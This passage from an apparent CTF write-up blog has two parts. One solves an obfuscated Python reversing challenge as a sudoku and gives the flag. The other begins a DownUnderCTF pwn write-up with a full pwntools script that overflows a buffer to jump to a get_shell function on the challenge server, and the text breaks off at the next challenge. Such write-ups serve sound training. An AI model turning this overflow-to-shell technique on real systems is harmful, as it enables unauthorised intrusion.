class="number">1</span> <span class="keyword">or</span> check1(l3) != <span class="number">1</span> <span class="keyword">or</span> check1(l4) != <span class="number">1</span> <span class="keyword">or</span> check1(l5) != <span class="number">1</span> <span class="keyword">or</span> check1(l6) != <span class="number">1</span> <span class="keyword">or</span> check1(l7) != <span class="number">1</span> <span class="keyword">or</span> check1(l8) != <span class="number">1</span> <span class="keyword">or</span> check1(l9) != <span class="number">1</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> check1(k1) != <span class="number">1</span> <span class="keyword">or</span> check1(k2) != <span class="number">1</span> <span class="keyword">or</span> check1(k3) != <span class="number">1</span> <span class="keyword">or</span> check1(k4) != <span class="number">1</span> <span class="keyword">or</span> check1(k5) != <span class="number">1</span> <span class="keyword">or</span> check1(k6) != <span class="number">1</span> <span class="keyword">or</span> check1(k7) != <span class="number">1</span> <span class="keyword">or</span> check1(k8) != <span class="number">1</span> <span class="keyword">or</span> check1(k9) != <span class="number">1</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (__print(<span class="string">&#x27;Yes! You got it!&#x27;</span>), __after())[<span class="number">1</span>]))))))))))))))) <span class="keyword">for</span> __g[<span class="string">&#x27;k9&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">60</span>] + context[<span class="number">61</span>] + context[<span class="number">62</span>] + context[<span class="number">69</span>] + context[<span class="number">70</span>] + context[<span class="number">71</span>] + context[<span class="number">78</span>] + context[<span class="number">79</span>] + context[<span class="number">80</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k8&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">57</span>] + context[<span class="number">58</span>] + context[<span class="number">59</span>] + context[<span class="number">66</span>] + context[<span class="number">67</span>] + context[<span class="number">68</span>] + context[<span class="number">75</span>] + context[<span class="number">76</span>] + context[<span class="number">77</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k7&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">54</span>] + context[<span class="number">55</span>] + context[<span class="number">56</span>] + context[<span class="number">63</span>] + context[<span class="number">64</span>] + context[<span class="number">65</span>] + context[<span class="number">72</span>] + context[<span class="number">73</span>] + context[<span class="number">74</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k6&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">33</span>] + context[<span class="number">34</span>] + context[<span class="number">35</span>] + context[<span class="number">42</span>] + context[<span class="number">43</span>] + context[<span class="number">44</span>] + context[<span class="number">51</span>] + context[<span class="number">52</span>] + context[<span class="number">53</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k5&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">30</span>] + context[<span class="number">31</span>] + context[<span class="number">32</span>] + context[<span class="number">39</span>] + context[<span class="number">40</span>] + context[<span class="number">41</span>] + context[<span class="number">48</span>] + context[<span class="number">49</span>] + context[<span class="number">50</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k4&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">27</span>] + context[<span class="number">28</span>] + context[<span class="number">29</span>] + context[<span class="number">36</span>] + context[<span class="number">37</span>] + context[<span class="number">38</span>] + context[<span class="number">45</span>] + context[<span class="number">46</span>] + context[<span class="number">47</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k3&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">6</span>] + context[<span class="number">7</span>] + context[<span class="number">8</span>] + context[<span class="number">15</span>] + context[<span class="number">16</span>] + context[<span class="number">17</span>] + context[<span class="number">24</span>] + context[<span class="number">25</span>] + context[<span class="number">26</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k2&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">3</span>] + context[<span class="number">4</span>] + context[<span class="number">5</span>] + context[<span class="number">12</span>] + context[<span class="number">13</span>] + context[<span class="number">14</span>] + context[<span class="number">21</span>] + context[<span class="number">22</span>] + context[<span class="number">23</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k1&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">0</span>] + context[<span class="number">1</span>] + context[<span class="number">2</span>] + context[<span class="number">9</span>] + context[<span class="number">10</span>] + context[<span class="number">11</span>] + context[<span class="number">18</span>] + context[<span class="number">19</span>] + context[<span class="number">20</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;l9&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">8</span>] + context[<span class="number">17</span>] + context[<span class="number">26</span>] + context[<span class="number">35</span>] + context[<span class="number">44</span>] + context[<span class="number">53</span>] + context[<span class="number">62</span>] + context[<span class="number">71</span>] + context[<span class="number">80</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;l8&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">7</span>] + context[<span class="number">16</span>] + context[<span class="number">25</span>] + context[<span class="number">34</span>] + context[<span class="number">43</span>] + context[<span class="number">52</span>] + context[<span class="number">61</span>] + context[<span class="number">70</span>] + context[<span class="number">79</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;l7&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">6</span>] + context[<span class="number">15</span>] + context[<span class="number">24</span>] + context[<span class="number">33</span>] + context[<span class="number">42</span>] + context[<span class="number">51</span>] + context[<span class="number">60</span>] + context[<span class="number">69</span>] + context[<span class="number">78</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;l6&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">5</span>] + context[<span class="number">14</span>] + context[<span class="number">23</span>] + context[<span class="number">32</span>] + context[<span class="number">41</span>] + context[<span class="number">50</span>] + context[<span class="number">59</span>] + context[<span class="number">68</span>] + context[<span class="number">77</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;l5&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">4</span>] + context[<span class="number">13</span>] + context[<span class="number">22</span>] + context[<span class="number">31</span>] + context[<span class="number">40</span>] + context[<span class="number">49</span>] + context[<span class="number">58</span>] + context[<span class="number">67</span>] + context[<span class="number">76</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;l4&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">3</span>] + context[<span class="number">12</span>] + context[<span class="number">21</span>] + context[<span class="number">30</span>] + context[<span class="number">39</span>] + context[<span class="number">48</span>] + context[<span class="number">57</span>] + context[<span class="number">66</span>] + context[<span class="number">75</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;l3&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">2</span>] + context[<span class="number">11</span>] + context[<span class="number">20</span>] + context[<span class="number">29</span>] + context[<span class="number">38</span>] + context[<span class="number">47</span>] + context[<span class="number">56</span>] + context[<span class="number">65</span>] + context[<span class="number">74</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;l2&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">1</span>] + context[<span class="number">10</span>] + context[<span class="number">19</span>] + context[<span class="number">28</span>] + context[<span class="number">37</span>] + context[<span class="number">46</span>] + context[<span class="number">55</span>] + context[<span class="number">64</span>] + context[<span class="number">73</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;l1&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">0</span>] + context[<span class="number">9</span>] + context[<span class="number">18</span>] + context[<span class="number">27</span>] + context[<span class="number">36</span>] + context[<span class="number">45</span>] + context[<span class="number">54</span>] + context[<span class="number">63</span>] + context[<span class="number">72</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;h9&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">72</span>:<span class="number">81</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;h8&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">63</span>:<span class="number">72</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;h7&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">54</span>:<span class="number">63</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;h6&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">45</span>:<span class="number">54</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;h5&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">36</span>:<span class="number">45</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;h4&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">27</span>:<span class="number">36</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;h3&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">18</span>:<span class="number">27</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;h2&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">9</span>:<span class="number">18</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;h1&#x27;</span>] <span class="keyword">in</span> [context[<span class="number">0</span>:<span class="number">9</span>]] ][<span class="number">0</span>])[<span class="number">1</span>])[<span class="number">1</span>])[<span class="number">1</span>])[<span class="number">1</span>])[<span class="number">1</span>])[<span class="number">1</span>])[<span class="number">1</span>])[<span class="number">1</span>])[<span class="number">1</span>]) <span class="keyword">for</span> __g[<span class="string">&#x27;d&#x27;</span>] <span class="keyword">in</span> [[]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;context&#x27;</span>] <span class="keyword">in</span> [<span class="built_in">input</span>[<span class="number">5</span>:<span class="number">-1</span>]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;fmt2&#x27;</span>] <span class="keyword">in</span> [<span class="built_in">input</span>[(<span class="number">-1</span>)]] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;fmt1&#x27;</span>] <span class="keyword">in</span> [<span class="built_in">input</span>[<span class="number">0</span>:<span class="number">5</span>]] ][<span class="number">0</span>])</span><br><span class="line"> <span class="keyword">for</span> __g[<span class="string">&#x27;input&#x27;</span>] <span class="keyword">in</span> [raw_input(<span class="string">&#x27;Input your flag:&#x27;</span>)] ][<span class="number">0</span>] <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : <span class="literal">None</span>)</span><br><span class="line"> <span class="keyword">for</span> __g[<span class="string">&#x27;check1&#x27;</span>], check1.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> arg: (<span class="keyword">lambda</span> __l: [ (<span class="keyword">lambda</span> __after: <span class="number">0</span> <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">set</span>(__l[<span class="string">&#x27;arg&#x27;</span>]))) != <span class="number">9</span> <span class="keyword">else</span> <span class="number">1</span>)(<span class="keyword">lambda</span> : <span class="literal">None</span>) <span class="keyword">for</span> __l[<span class="string">&#x27;arg&#x27;</span>] <span class="keyword">in</span> [arg] ][<span class="number">0</span>])(&#123;&#125;), <span class="string">&#x27;check1&#x27;</span>)] ][<span class="number">0</span>]</span><br><span class="line"> <span class="keyword">for</span> __g[<span class="string">&#x27;check&#x27;</span>], check.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> arg: (<span class="keyword">lambda</span> __l: [ <span class="built_in">sum</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, __l[<span class="string">&#x27;arg&#x27;</span>])) <span class="keyword">for</span> __l[<span class="string">&#x27;arg&#x27;</span>] <span class="keyword">in</span> [arg] ][<span class="number">0</span>])(&#123;&#125;), <span class="string">&#x27;check&#x27;</span>)] ][<span class="number">0</span>])(<span class="built_in">globals</span>(), <span class="built_in">__import__</span>(<span class="string">&#x27;__builtin__&#x27;</span>, level=<span class="number">0</span>).__dict__[<span class="string">&#x27;print&#x27;</span>])</span><br><span class="line"><span class="comment"># okay decompiling fu!k.pyc</span></span><br></pre></td></tr></table></figure>



<ul>
<li>d,l,h分别表示3x3块，列，行</li>
<li>先判断列表的长度是否为9</li>
<li>check求和</li>
</ul>
<p>是一个9x9的数独游戏，根据已知数据，求解未知就行</p>
<p>将一下生成的内容导入到数独求解器中求解即可.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python script for sudoku</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数独求解</span></span><br><span class="line"><span class="comment"># http://www.llang.net/sudoku/calsudoku.html</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line">d = [</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">d[<span class="number">0</span>][<span class="number">2</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">d[<span class="number">0</span>][<span class="number">3</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">d[<span class="number">1</span>][<span class="number">0</span>] = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">d[<span class="number">1</span>][<span class="number">7</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">d[<span class="number">2</span>][<span class="number">1</span>] = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">d[<span class="number">2</span>][<span class="number">4</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">d[<span class="number">2</span>][<span class="number">6</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">d[<span class="number">3</span>][<span class="number">0</span>] = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">d[<span class="number">3</span>][<span class="number">5</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">d[<span class="number">3</span>][<span class="number">6</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">d[<span class="number">4</span>][<span class="number">1</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">d[<span class="number">4</span>][<span class="number">4</span>] = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">d[<span class="number">4</span>][<span class="number">8</span>] = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">d[<span class="number">5</span>][<span class="number">2</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">d[<span class="number">5</span>][<span class="number">3</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">d[<span class="number">5</span>][<span class="number">7</span>] = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">d[<span class="number">6</span>][<span class="number">1</span>] = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">d[<span class="number">6</span>][<span class="number">3</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">d[<span class="number">6</span>][<span class="number">8</span>] = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">d[<span class="number">7</span>][<span class="number">2</span>] = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">d[<span class="number">7</span>][<span class="number">7</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">d[<span class="number">8</span>][<span class="number">5</span>] = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">d[<span class="number">8</span>][<span class="number">6</span>] = <span class="string">&#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        l = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                l += <span class="built_in">str</span>(j)</span><br><span class="line">        print(l)</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">logan@arch:~ » python exp.py</span><br><span class="line">005300000</span><br><span class="line">800000020</span><br><span class="line">070010500</span><br><span class="line">400005300</span><br><span class="line">010070006</span><br><span class="line">003200080</span><br><span class="line">060500009</span><br><span class="line">004000030</span><br><span class="line">000009700</span><br><span class="line">000000000</span><br></pre></td></tr></table></figure>

<p>求得</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">145327698839654127672918543496185372218473956753296481367542819984761235521839764</span><br></pre></td></tr></table></figure>

<p>即flag为flag{145327698839654127672918543496185372218473956753296481367542819984761235521839764}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/26/wp-jk-2020/" data-id="ckhemv82u0036wdcm8w1233bf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-down-under-ctf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/22/wp-down-under-ctf/" class="article-date">
  <time datetime="2020-09-21T16:32:31.000Z" itemprop="datePublished">2020-09-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/22/wp-down-under-ctf/">wp DownUnderCTF</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="DownUnderCTF-PWN-WP"><a href="#DownUnderCTF-PWN-WP" class="headerlink" title="DownUnderCTF PWN WP"></a>DownUnderCTF PWN WP</h1><p><a target="_blank" rel="noopener" href="https://play.duc.tf/login?next=/team?next=%252Fchallenges%253F#added%20protection-63">platform</a></p>
<h2 id="1-shellthis"><a href="#1-shellthis" class="headerlink" title="1 [shellthis]"></a>1 [shellthis]</h2><p>There is a backdoor function named get_shell, then use ret2txt way to get shell</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;chal.duc.tf&quot;</span></span><br><span class="line">server_port = <span class="number">30002</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(elf.sym[<span class="string">&#x27;get_shell&#x27;</span>])</span><br><span class="line">	sl(p)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="2-return-to-what"><a href="#2-return-to-what" class="headerlink" title="2 [return-to-what]"></a>2 [return-to-what]</h2><p>This vuln </p>
